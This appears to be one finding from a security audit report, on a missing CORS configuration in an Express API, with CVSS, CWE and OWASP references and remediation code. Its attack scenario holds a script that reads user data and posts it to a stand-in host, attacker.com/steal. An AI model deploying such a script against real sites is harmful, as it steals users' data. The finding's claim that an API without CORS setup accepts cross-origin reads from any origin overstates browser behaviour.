## 11. No CORS Security Configuration (LOW)

### Issue ID: SEC-011
**Severity:** LOW  
**CVSS Score:** 4.3 (Low)  
**CWE:** CWE-346 (Origin Validation Error)  
**OWASP Top 10:** A05:2021 – Broken Access Control

### Description
Without CORS configuration, the API will accept requests from any origin. This could allow:
- Cross-site request forgery (CSRF)
- Cross-origin data leakage
- Third-party integration without controls

### Attack Scenario
```html
<!-- Attacker's website -->
<script>
  fetch('http://victim-api.local:3000/users')
    .then(r => r.json())
    .then(data => {
      // Send to attacker's server
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
</script>
```

### Recommendations

1. **Configure CORS explicitly:**
   ```bash
   npm install cors
   ```

   ```javascript
   const cors = require('cors');

   const corsOptions = {
     origin: ['https://trusted-domain.com', 'https://app.example.com'],
     credentials: true,
     optionsSuccessStatus: 200,
     methods: ['GET', 'POST'],
     allowedHeaders: ['Content-Type', 'Authorization'],
     maxAge: 3600
   };

   app.use(cors(corsOptions));
   ```

2. **Restrict preflight options:**
   ```javascript
   app.options('*', cors(corsOptions));
   ```

3. **Additional headers:**
   ```javascript
   app.use((req, res, next) => {
     res.setHeader('Access-Control-Max-Age', '3600');
     next();
   });
   ```

